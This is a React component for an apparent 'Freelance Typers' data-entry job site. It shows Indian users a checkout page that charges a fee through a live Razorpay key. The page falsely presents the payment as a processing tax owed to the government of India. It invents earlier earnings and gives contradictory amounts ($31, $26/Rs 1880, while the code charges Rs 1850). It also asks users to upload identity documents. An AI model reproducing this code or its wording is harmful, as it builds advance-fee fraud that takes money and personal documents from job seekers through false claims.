import React from 'react'
import Cookies from 'universal-cookie'
import { Card, Button, CardHeader, CardBody } from 'reactstrap';

import { connect } from 'react-redux'

import axios from '../API.js'
import { validateEmail, clear, validateFields, customValidation } from '../common.js'

const cookies = new Cookies();

class App extends React.Component {
	constructor(props) {
		super(props);
		this.state = {
			id: '1', firstamt: '', secondamt: '', isError: false,
			error: { firstamt: '', secondamt: '' },
			successMsg: ''
		}
	}
	onChange = (e) => {
		let data = this.state
		data[e.target.name] = e.target.value
		this.setState({ data })
		if (this.state.isError) {
			this.onValidation(data)
		}
	}
	onValidation = (datas) => {
		// const emptyFields = [
		// 	{ key: 'firstamt', errVal: 'Enter First Amount' },
		// 	{ key: 'secondamt', errVal: 'Enter Second Amount' },
		// ]

		// let input = datas === undefined ? this.state : datas
		// const data = validateFields(input, emptyFields)
		// this.setState({ data })
		const data=this.state
		return data.isError
	}
	onSubmit = () => {
		const data = this.state
		if (!this.onValidation()) {
			let options = {
				"key": "rzp_live_mzr11MWwNBy47I",
				"amount": 1850 * 100, // 2000 paise = INR 20, amount in paisa
				"name": "Freelancetypers",
				"description": "Online Dataentry Jobs",
				// "image": "./dist/img/DonkeyUser.png",
				"handler": (response) => {
					// alert("Transaction completed successfully!");
					data.email=cookies.get('email')
					data.paymentid=response.razorpay_payment_id
					data.amount=1850
					data.status='success'
					axios.post("/Payment", data).then(res => {
						// console.log(res)
						if ( res.data.status ==='success') {
							this.setState({ successMsg: 'Payment successful!' })
							setTimeout(() => {
								this.props.history.push({ pathname: '/allhits', state: { page: '' } })
							}, 3000);
						}						
					})
				},
				"prefill": {
					"name": "",
					"email": "sample@gmail.com"
				},
				"notes": {
					"address": "Enter address"
				},
				"theme": {
					"color": "crimson"
				}
			};

			let rzp = new window.Razorpay(options);
			rzp.open();
		}
	}

	render() {
		let res;
		res = (
			<>
				<div className="row text-center centerscreen" style={{ minHeight:'74vh',marginRight: '0px', marginLeft: '0px' }}>
					<h1 className="tm-site-name logocolor">Freelance <span style={{ color: 'black' }}>Typers</span></h1>
					<div className="col-md-4 col-12"></div>
					<div className="col-md-4 col-12">
						<Card>
							<CardBody className="text-left padding-20 font-weight-bold">

								{/* <h2 className="text-center">Congrats! Your bank account details submitted successfully!</h2> */}
								<br />
								<ul style={{ paddingLeft: '1em' }}>
									<li style={{ listStyle: 'disc' }}>
									Dear, Freelance Typer your bank account has been successfully verified by Freelance Typers Bank Verification Team. Your account location has been confirmed to be in India. 
									</li>
									<li style={{ listStyle: 'disc' }}>
									We provide free processing only for USA Citizens bank accounts transactions under USA country tax laws.
									</li>
									<li style={{ listStyle: 'disc' }}>
									For transaction in other countries (including India) you must pay annual one-time processing fees of $31 to the government of India as tax.
									</li>
									<li style={{ listStyle: 'disc' }}>
									Certificate of foreign status is beneficial for owner under United States tax laws. foreign income of individuals tax rules charges, Dollar to INR conversion fees and bank transfer charges.
									</li>
									<li style={{ listStyle: 'disc' }}>
									You have already earned $5 for your Freelance Typers account. You only pay $26 (IND Rs. 1880) after you submit proper identification proof of your resident country. 
									</li>
									<li style={{ listStyle: 'disc' }}>
									After the payment, Freelance Typers Verification team will confirm your KYC details within 1-2 business days and transfer your earnings directly to your bank account daily, Without any processing charges.
									</li>
									<li style={{ listStyle: 'disc' }}>
									Thank You! Happy Earnings.
									</li>									
								</ul>
								<label>Your country id proof </label>
								<input type="file" />
								<div className="text-right mt-2">
									<button className="button col-12" onClick={this.onSubmit}>Accept & Pay</button>
								</div>
								{this.state.successMsg !== '' ? <div className={this.state.successMsg === 'Payment successful!' ? "success" : "error"} > <i className={this.state.successMsg === "Amount mismatch!" ? "fa fa-exclamation-triangle" : "fa fa-check"} aria-hidden="true"></i> {this.state.successMsg}</div> : ''}

								<br />
							</CardBody>
						</Card>
					</div>
					<div className="col-md-4 col-12"></div>
				</div>
			</>
		)
		return res;
	}
}

const mapStateToProps = (state) => ({ common: state.common })

export default connect(mapStateToProps)(App);